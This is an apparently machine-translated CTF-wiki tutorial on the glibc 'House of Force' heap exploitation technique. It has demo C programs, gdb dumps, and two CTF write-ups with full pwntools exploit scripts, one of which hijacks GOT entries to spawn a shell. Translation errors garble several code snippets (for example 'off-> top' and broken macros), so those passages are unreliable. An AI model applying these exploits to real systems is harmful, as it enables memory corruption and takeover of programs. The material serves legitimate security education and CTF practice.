[EN](./house_of_force.md) | [ZH](./house_of_force-zh.md)
# House Of Force



## Introduction
House Of Force belongs to the House Of XXX series, and House Of XXX is a series of methods for the glibc stacker proposed in the 2004 &quot;The Malloc Maleficarum-Glibc Malloc Exploitation Techniques&quot;.
However, most of the methods proposed in The Malloc Maleficarum have not worked today, and the House Of XXX we are referring to now is quite different from the one written in the 2004 article. But &quot;The Malloc Maleficarum&quot; is still a recommended article, you can read the original text here:
https://dl.packetstormsecurity.net/papers/attack/MallocMaleficarum.txt



## Principle
House Of Force is a heap utilization method, but it does not mean that House Of Force must be exploited based on heap vulnerabilities. If a heap based vulnerability is to be exploited by the House Of Force method, the following conditions are required:


1. Ability to control the size field of the top chunk by overflow, etc.
2. Be able to freely control the size of the heap allocation size


The reason that House Of Force is generated is that glibc handles the top chunk. According to the knowledge of the previous heap data structure, we know that when all the free blocks are unable to meet the requirements, the heap will be split from the top chunk. The corresponding size is used as the space for the heap block.


So what happens when the top chunk is used to allocate the size of the heap block to any value controlled by the user? The answer is that you can make the top chunk point to whatever we want, which is equivalent to an arbitrary address write. However, in glibc, the size of the user request and the existing size of the top chunk are verified.
```

// Get the current top chunk and calculate its corresponding size
victim = off-&gt; top;
size   = chunksize(victim);

// If after splitting, its size still satisfies the minimum size of chunk, then you can split directly.
if ((unsigned long) (size) >= (unsigned long) (nb + MINSIZE)) 

{

    remainder_size = size - nb;

    remainder      = chunk_at_offset(victim, nb);

off-&gt; top = remainder;
    set_head(victim, nb | PREV_INUSE |

(av! = &amp; main_arena? NON_MAIN_ARENA: 0));
    set_head(remainder, remainder_size | PREV_INUSE);



check_malloced_chunk (off, victim, nb);
    void *p = chunk2mem(victim);

    alloc_perturb(p, bytes);

    return p;

}

```

However, if you can tamper with size to a large value, you can easily pass this verification, which is what we said earlier that you need a vulnerability that can control the top chunk size field.


```

(unsigned long) (size) >= (unsigned long) (nb + MINSIZE)

```

The general practice is to change the size of the top chunk to -1, because the size is converted to an unsigned number when comparing, so -1 is the largest number of unsigned longs, so you can pass the verification anyway.


```

remainder      = chunk_at_offset(victim, nb);

off-&gt; top = remainder;


/* Treat space at ptr + offset as a chunk */

#define chunk_at_offset(p, s) ((mchunkptr)(((char *) (p)) + (s)))

```

After that, the top pointer will be updated, and the next heap block will be allocated to this location. The user only needs to control the pointer to write arbitrary values (write-anything-anywhere).


** At the same time, we need to pay attention to the topchunk size will also be updated, the update method is as follows **


```c

victim = off-&gt; top;
size   = chunksize(victim);

remainder_size = size - nb;

set_head(remainder, remainder_size | PREV_INUSE);

```



So, if we want to allocate chunks of size x at the specified location next time, we need to make sure that the remainder_size is not less than x+ MINSIZE.


## Simple example 1
After learning the principles of HOF, we use an example to illustrate the use of HOF. The goal of this example is to tamper with `malloc@got.plt` by HOF to implement the hijacking process.


```

int main()

{

long * ptr, * ptr2;
ptr = malloc (0x10);
ptr = (long *) (((long) ptr) +24);
*ptr=-1; // &lt;=== Change the size field of the top chunk to 0xffffffffffffffff
Malloc(-4120); // &lt;=== reduce the top chunk pointer
Malloc(0x10); // &lt;=== allocate blocks to implement arbitrary address writes
}

```



First, we allocate a block of size 0x10 bytes.


```

0x602000: 0x0000000000000000 0x0000000000000021 &lt;=== ptr
0x602010:	0x0000000000000000	0x0000000000000000

0x602020:	0x0000000000000000	0x0000000000020fe1 <=== top chunk

0x602030:	0x0000000000000000	0x0000000000000000

```

Then change the size of the top chunk to 0xffffffffffffffff 1⁄4 In the real problem, this step can be achieved through a vulnerability such as heap overflow.
Since -1 is represented by 0xffffffffffffff in the complement, we can assign -1 directly.


```

0x602000: 0x0000000000000000 0x0000000000000021 &lt;=== ptr
0x602010:	0x0000000000000000	0x0000000000000000

0x602020: 0x0000000000000000 0xffffffffffffffff &lt;=== top chunk size field was changed
0x602030:	0x0000000000000000	0x0000000000000000

```

Notice the top chunk location at this point, and when we make the next allocation, we will change the position of the top chunk to where we want it.


```

0x7ffff7dd1b20 <main_arena>:	0x0000000100000000	0x0000000000000000

0x7ffff7dd1b30 <main_arena+16>:	0x0000000000000000	0x0000000000000000

0x7ffff7dd1b40 <main_arena+32>:	0x0000000000000000	0x0000000000000000

0x7ffff7dd1b50 <main_arena+48>:	0x0000000000000000	0x0000000000000000

0x7ffff7dd1b60 <main_arena+64>:	0x0000000000000000	0x0000000000000000

0x7ffff7dd1b70 <main_arena+80> : 0x0000000000000000 0x0000000000602020 &lt;=== top chunk at this point everything is fine
0x7ffff7dd1b80 <main_arena+96>:	0x0000000000000000	0x00007ffff7dd1b78

```

Next we execute `malloc(-4120);`,-4120 is how to get it?
First, we need to know the destination address to be written. Here, after I compile the program, 0x601020 is the address of `malloc@got.plt`


```

0x601020:	0x00007ffff7a91130 <=== malloc@got.plt

```

So we should point the top chunk to 0x601010 so that the next time we allocate the chunk, we can allocate the memory at `malloc@got.plt`.


After clearing the address of the current top chunk, according to the previous description, the top chunk is located at 0x602020, so we can calculate the offset as follows


0x601010-0x602020=-4112



In addition, the size of the memory requested by the user becomes an unsigned integer once it enters the function of applying for memory.


```c

void *__libc_malloc(size_t bytes) {

```



If you want the size of the user input to go through the internal `checked_request2size`, you can get this size, ie


```c
/*

   Check if a request is so large that it would wrap around zero when

   padded and aligned. To simplify some other code, the bound is made

   low enough so that adding MINSIZE will also not wrap around zero.

 */



#define REQUEST_OUT_OF_RANGE(req)                                              \

    ((unsigned long) (req) >= (unsigned long) (INTERNAL_SIZE_T)(-2 * MINSIZE))

/* pad request bytes into a usable size -- internal version */

//MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1

#define request2size(req)                                                      \

    (((req) + SIZE_SZ + MALLOC_ALIGN_MASK < MINSIZE)                           \

         ? MINSIZE                                                             \

         : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) & ~MALLOC_ALIGN_MASK)



/*  Same, except also perform argument check */



#define checked_request2size(req, sz)                                          \

    if (REQUEST_OUT_OF_RANGE(req)) {                                           \

        __set_errno(ENOMEM);                                                   \

        return 0;                                                              \

    }                                                                          \

    (sz) = request2size(req);

```



On the one hand, we need to bypass the REQUEST_OUT_OF_RANGE(req) test, that is, the value we pass to malloc is in the negative range, not greater than -2 * MINSIZE, which is generally acceptable.


On the other hand, after satisfying the corresponding constraints, we need to make `request2size` exactly convert to the corresponding size, that is, we need to make ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK exactly -4112. First of all, it is clear that -4112 is chunk aligned, then we only need to subtract SIZE_SZ, MALLOC_ALIGN_MASK to get the corresponding value to be applied. In fact, we only need to reduce SIZE_SZ here, because the more reduced MALLOC_ALIGN_MASK will eventually be aligned. And ** If -4112 is not MALLOC_ALIGN, we need to reduce more. Of course, we&#39;d better make the chunks that are obtained after the allocation are also aligned, because when a chunk is released, an alignment check is performed. **


So, after calling `malloc(-4120)`, we can observe that the top chunk is raised to the position we want.


```

0x7ffff7dd1b20 <main_arena>:\	0x0000000100000000	0x0000000000000000

0x7ffff7dd1b30 <main_arena+16>:	0x0000000000000000	0x0000000000000000

0x7ffff7dd1b40 <main_arena+32>:	0x0000000000000000	0x0000000000000000

0x7ffff7dd1b50 <main_arena+48>:	0x0000000000000000	0x0000000000000000

0x7ffff7dd1b60 <main_arena+64>:	0x0000000000000000	0x0000000000000000

0x7ffff7dd1b70 <main_arena+80> : 0x0000000000000000 0x0000000000601010 &lt;=== It can be observed that the top chunk is raised
0x7ffff7dd1b80 <main_arena+96>:	0x0000000000000000	0x00007ffff7dd1b78

```

After that, our assigned block will appear at 0x601010+0x10, that is, 0x601020 can change the contents of the got table.


However, it should be noted that while being elevated, the content near malloc@got will also be modified.


```c

    set_head(victim, nb | PREV_INUSE |

(av! = &amp; main_arena? NON_MAIN_ARENA: 0));
```



## Simple example 2
In the previous example, we demonstrated modifying the contents of the got table above it (lower address) by reducing the pointer of the top chunk by HOF.
But HOF can actually make the top chunk pointer increase to modify the content in the high address space. We demonstrate this by using this example.


```

int main()

{

long * ptr, * ptr2;
ptr = malloc (0x10);
ptr = (long *) (((long) ptr) +24);
*ptr=-1; &lt;=== Modify top chunk size
Malloc(140737345551056); &lt;=== Increase the top chunk pointer
    malloc(0x10);

}

```

We can see that the program code is basically the same as the simple example 1, except that the size of the second malloc is different.
This time our goal is malloc_hook, we know that malloc_hook is the value of the global variable in libc.so, first look at the memory layout


```

Start              End                Offset             Perm Path

0x0000000000400000 0x0000000000401000 0x0000000000000000 rx /home/vb/desktop/tst/t1
0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/vb/desktop/tst/t1
0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/vb/desktop/tst/t1
0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap]

0x00007ffff7a0d000 0x00007ffff7bcd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so

0x00007ffff7bcd000 0x00007ffff7dcd000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so

0x00007ffff7dcd000 0x00007ffff7dd1000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so

0x00007ffff7dd1000 0x00007ffff7dd3000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so

0x00007ffff7dd3000 0x00007ffff7dd7000 0x0000000000000000 rw- 

0x00007ffff7dd7000 0x00007ffff7dfd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.23.so

0x00007ffff7fdb000 0x00007ffff7fde000 0x0000000000000000 rw- 

0x00007ffff7ff6000 0x00007ffff7ff8000 0x0000000000000000 rw- 

0x00007ffff7ff8000 0x00007ffff7ffa000 0x0000000000000000 r-- [vvar]

0x00007ffff7ffa000 0x00007ffff7ffc000 0x0000000000000000 r-x [vdso]

0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000025000 r-- /lib/x86_64-linux-gnu/ld-2.23.so

0x00007ffff7ffd000 0x00007ffff7ffe000 0x0000000000026000 rw- /lib/x86_64-linux-gnu/ld-2.23.so

0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw- 

0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]

0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]

```

You can see that the base address of the heap is 0x602000, and the base address of libc is 0x7ffff7a0d000, so we need to expand the value of the top chunk pointer by HOF to implement the write to malloc_hook.
First, the debug knows that the address of __malloc_hook is at 0x7ffff7dd1b10 and takes the calculation.


0x7ffff7dd1b00-0x602020-0x10=140737345551056

After this malloc, we can observe that the address of the top chunk is raised to 0x00007ffff7dd1b00


```

0x7ffff7dd1b20 <main_arena>:	0x0000000100000000	0x0000000000000000

0x7ffff7dd1b30 <main_arena+16>:	0x0000000000000000	0x0000000000000000

0x7ffff7dd1b40 <main_arena+32>:	0x0000000000000000	0x0000000000000000

0x7ffff7dd1b50 <main_arena+48>:	0x0000000000000000	0x0000000000000000

0x7ffff7dd1b60 <main_arena+64>:	0x0000000000000000	0x0000000000000000

0x7ffff7dd1b70 <main_arena+80>:	0x0000000000000000	0x00007ffff7dd1b00 <=== top chunk

0x7ffff7dd1b80 <main_arena+96>:	0x0000000000000000	0x00007ffff7dd1b78

```

After that, we can control the __malloc_hook value at 0x7ffff7dd1b10 as long as we allocate it again.


```

rax = 0x00007ffff7dd1b10
    

0x400562 <main+60> mov, 0x10
0x400567 <main+65>        call   0x400410 <malloc@plt>

```



## 小述
In this section, we explain the principle of House Of Force and give a simple example of two uses. By observing these two simple examples, we will find that the utilization requirements of HOF are still quite demanding.


* First, a vulnerability is required to allow the user to control the size field of the top chunk.
* Secondly, ** requires the user to freely control the allocation size of malloc**
* Third, the number of allocations cannot be restricted


In fact, the second of these three points is often the most difficult. In the CTF topic, the size limit of the heap block is often allocated to the user, and the maximum and maximum values cannot be utilized by the HOF method.


## HITCON training lab 11

[Topic link] (https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/house-of-force/hitcontraning_lab11)


Here, we mainly modify its magic function to





### Basic Information


```shell

➜  hitcontraning_lab11 git:(master) file bamboobox     

bamboobox: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=595428ebf89c9bf7b914dd1d2501af50d47bbbe1, not stripped

➜  hitcontraning_lab11 git:(master) checksec bamboobox 

[*] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/house_of_force/hitcontraning_lab11/bamboobox'

    Arch:     amd64-64-little

    RELRO:    Partial RELRO

    Stack:    Canary found

    NX:       NX enabled

    PIE:      No PIE (0x400000)

```



The program is a 64-bit dynamic linker.


### basic skills


It should be noted that the program starts with 0x10 memory and is used to retain ** two function pointers**.


The program probably adds and removes items from the box.


1. Show the contents of the box, and then the name of each item in the box.
2. Add items to the box, and apply the corresponding memory for each item according to the size of the user input, as the space for storing the name. However, it should be noted that the read name is the `read` function, the read length parameter is the user input v2, and the read third parameter is the unsigned integer. If we enter a negative number, we can read it. Any length. But we need to make sure that the value satisfies the constraint of `REQUEST_OUT_OF_RANGE`, so there is a vulnerability of ** any length heap overflow**. But even then, the first time is more difficult to use, because the size of the top chunk of the heap is generally not very large.
3. Modify the name of the item, and read the specified length name from the specified index item according to the given index and size. The length here is read by the user, and there is also a vulnerability of ** any length heap overflow**.
4. Delete the item, set the size of the corresponding item to 0, and set the corresponding content to NULL.


In addition, since the program is mainly a demo program, there is a magic function in the program that can directly read the flag.


### Use


Since there is a magic function in the program, our core purpose is to override a pointer to a magic function. Here, the program applies a block of memory to store two function pointers at the beginning, hello_message is used at the beginning of the program, and goodbye_message is used at the end of the program, so we can override the program execution flow by overriding goodbye_message. The specific ideas are as follows


1. Add an item and use a heap overflow vulnerability to overwrite the top chunk to a size of -1, which is the 64-bit maximum.
2. Use the house of force technique to assign the chunk to the base address of the heap.
3. Override goodbye_message as the magic function address to control the program execution flow


** It should be noted here that when triggering the top chunk to move to the specified location, the size should be appropriate to set the new top chunk size so that the detection of the next top chunk can be bypassed. **


Exp is as follows


```shell

#!/usr/bin/env python

# -*- coding: utf-8 -*-



from pwn import *



r = process('./bamboobox')

context.log_level = 'debug'





def additem(length, name):

    r.recvuntil(":")

    r.sendline("2")

    r.recvuntil(":")

    r.sendline(str(length))

    r.recvuntil(":")

    r.sendline(name)





def modify(idx, length, name):

    r.recvuntil(":")

    r.sendline("3")

    r.recvuntil(":")

    r.sendline(str(idx))

    r.recvuntil(":")

    r.sendline(str(length))

    r.recvuntil(":")

    r.sendline(name)





def remove(idx):

    r.recvuntil(":")

    r.sendline("4")

    r.recvuntil(":")

    r.sendline(str(idx))





def show():

    r.recvuntil(":")

    r.sendline("1")





magic = 0x400d49

# we must alloc enough size, so as to successfully alloc from fake topchunk

additem(0x30, "ddaa")  # idx 0

payload = 0x30 * 'a'  # idx 0's content

payload += 'a' * 8 + p64(0xffffffffffffffff)  # top chunk's prev_size and size

# modify topchunk's size to -1

modify(0, 0x41, payload)

# top chunk's offset to heap base

offset_to_heap_base = -(0x40 + 0x20)

malloc_size = offset_to_heap_base - 0x8 - 0xf

#gdb.attach(r)

additem(malloc_size, "dada")

additem(0x10, p64(magic) * 2)

print r.recv()

r.interactive()



```



Of course, this problem can also be done using the unlink method.


## 2016 BCTF bcloud

[Topic link] (https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/house-of-force/2016_bctf_bcloud)


### Basic Information


```shell

➜  2016_bctf_bcloud git:(master) file bcloud   

bcloud: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=96a3843007b1e982e7fa82fbd2e1f2cc598ee04e, stripped

➜  2016_bctf_bcloud git:(master) checksec bcloud  

[*] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/house_of_force/2016_bctf_bcloud/bcloud'

    Arch:     i386-32-little

    RELRO:    Partial RELRO

    Stack:    Canary found

    NX:       NX enabled

    PIE:      No PIE (0x8048000)

```



It can be seen that this is a dynamically linked 32-bit program that primarily enables Canary protection and NX protection.


### basic skills


The program is probably a cloud note management system. First, the program will do some initialization, set the user&#39;s name, organization, host. The program mainly has the following functions

1. Create a new note and apply x+4 space as the size of the note based on the user&#39;s input x.
2. Show the note, no function. .
3. Edit the note and edit the corresponding content according to the note specified by the user.
4. Delete the note and delete the corresponding note.
5. Synchronize the note and mark all the notes have been synchronized.


However, no flaws were found in these five functions, and the program was revisited. As a result, it was found that the program was vulnerable when it was initialized. .


Initial name


```c

unsigned int init_name()

{

  char s; // [esp+1Ch] [ebp-5Ch]

  char *tmp; // [esp+5Ch] [ebp-1Ch]

  unsigned int v3; // [esp+6Ch] [ebp-Ch]



v3 = __readgsdword (0x14u);
  memset(&s, 0, 0x50u);

  puts("Input your name:");

  read_str(&s, 64, '\n');

  tmp = (char *)malloc(0x40u);

  name = tmp;

  strcpy(tmp, &s);

  info(tmp);

  return __readgsdword(0x14u) ^ v3;

}

```



Here, if the name read by the program is 64 characters, then when the program outputs the corresponding string using the info function, the corresponding tmp pointer content is output, that is, ** leaks the heap address**. .


Vulnerabilities when initializing organization and org


```c

unsigned int init_org_host()

{

  char s; // [esp+1Ch] [ebp-9Ch]

  char *v2; // [esp+5Ch] [ebp-5Ch]

  char v3; // [esp+60h] [ebp-58h]

char * v4; // [esp + A4h] [ebp-14h]
  unsigned int v5; // [esp+ACh] [ebp-Ch]



  v5 = __readgsdword(0x14u);

  memset(&s, 0, 0x90u);

  puts("Org:");

  read_str(&s, 64, 10);

  puts("Host:");

  read_str(&v3, 64, 10);

v4 = (char *) malloc (0x40u);
  v2 = (char *)malloc(0x40u);

  org = v2;

host = v4;
strcpy (v4, &amp; v3);
  strcpy(v2, &s);

  puts("OKay! Enjoy:)");

  return __readgsdword(0x14u) ^ v5;

}

```



When reading into an organization, given 64 bytes, the lower address of v2 is overwritten. At the same time, we can know that v2 is a chunk adjacent to the top chunk, and v2 is just adjacent to org. Since 32-bit programs are generally used in 32-bit programs, the content stored in v2 is almost To a large extent, it is not `\x00` , so when you execute the strcpy function to copy content to v2, it is likely to overwrite the top chunk. This is where the vulnerability lies.


### Use


1. Use the vulnerability at the initialization name to leak the base address of the heap. .
2. Use the house of force to allocate the top chunk to the global 0esize-8 of 0x0804B0A0. When the memory is applied again, it returns the memory at the noteize address, so that we can control the size of all the notes and the corresponding addresses.
3. Modify the size of the first three notes to 16, and modify the pointer to free@got, atoni@got, atoni@got
4. Change free@got to puts@plt.
5. Leak the atoi address.
6. Modify another atoi got item to the system address again to get the shell.


The specific script is as follows


```python

from pwn import *

context.terminal = ['gnome-terminal', '-x', 'sh', '-c']

if args['DEBUG']:

    context.log_level = 'debug'

context.binary = "./bcloud"

bcloud = ELF (&quot;./ bcloud&quot;)
if args['REMOTE']:

    p = remote('127.0.0.1', 7777)

else:

    p = process("./bcloud")

log.info('PID: ' + str(proc.pidof(p)[0]))

libc = ELF('./libc.so.6')





def offset_bin_main_arena(idx):

    word_bytes = context.word_size / 8

    offset = 4  # lock

    offset += 4  # flags

    offset += word_bytes * 10  # offset fastbin

    offset += word_bytes * 2  # top,last_remainder

    offset += idx * 2 * word_bytes  # idx

    offset -= word_bytes * 2  # bin overlap

    return offset





def exp():

    # leak heap base

    p.sendafter('Input your name:\n', 'a' * 64)

    p.recvuntil('Hey ' + 'a' * 64)

    # sub name's chunk' s header

    heap_base = u32(p.recv(4)) - 8

    log.success('heap_base: ' + hex(heap_base))

    p.sendafter('Org:\n', 'a' * 64)

    p.sendlineafter('Host:\n', p32(0xffffffff))

    # name,org,host, for each is (0x40+8)

    topchunk_addr = heap_base + (0x40 + 8) * 3



    # make topchunk point to 0x0804B0A0-8

    p.sendlineafter('option--->>', '1')

    notesize_addr = 0x0804B0A0

    notelist_addr = 0x0804B120

    targetaddr = notesize_addr - 8

    offset_target_top = targetaddr - topchunk_addr

    # 4 for size_t, 7 for malloc_allign

    malloc_size = offset_target_top - 4 - 7

    # plus 4 because malloc(v2 + 4);

    p.sendlineafter('Input the length of the note content:\n',

                    str(malloc_size - 4))

    # most likely malloc_size-4<0...

    if malloc_size - 4 > 0:

        p.sendlineafter('Input the content:\n', '')



    #gdb.attach(p)
# set notesize [0] = notesize [1] = notesize [2] = 16
    # set notelist[0] = free@got, notelist[1]= notelist[2]=atoi@got

    p.sendlineafter('option--->>', '1')

    p.sendlineafter('Input the length of the note content:\n', str(1000))



    payload = p32(16) * 3 + (notelist_addr - notesize_addr - 12) * 'a' + p32(

        bcloud.got['free']) + p32(bcloud.got['atoi']) * 2

    p.sendlineafter('Input the content:\n', payload)



    # overwrite free@got with puts@plt

    p.sendlineafter('option--->>', '3')

    p.sendlineafter('Input the id:\n', str(0))

    p.sendlineafter('Input the new content:\n', p32(bcloud.plt['puts']))



    # leak atoi addr by fake free

    p.sendlineafter('option--->>', '4')

    p.sendlineafter('Input the id:\n', str(1))

    atoi_addr = u32(p.recv(4))

    libc_base = atoi_addr - libc.symbols['atoi']

    system_addr = libc_base + libc.symbols['system']

    log.success('libc base addr: ' + hex(libc_base))



    # overwrite atoi@got with system

    p.sendlineafter('option--->>', '3')

    p.sendlineafter('Input the id:\n', str(2))

    p.sendlineafter('Input the new content:\n', p32(system_addr))



    # get shell

    p.sendlineafter('option--->>', '/bin/sh\x00')

    p.interactive()





if __name__ == "__main__":

    exp()

```







## topic


- [2016 Boston Key Party CTF cookbook](https://github.com/ctfs/write-ups-2016/tree/master/boston-key-party-2016/pwn/cookbook-6)
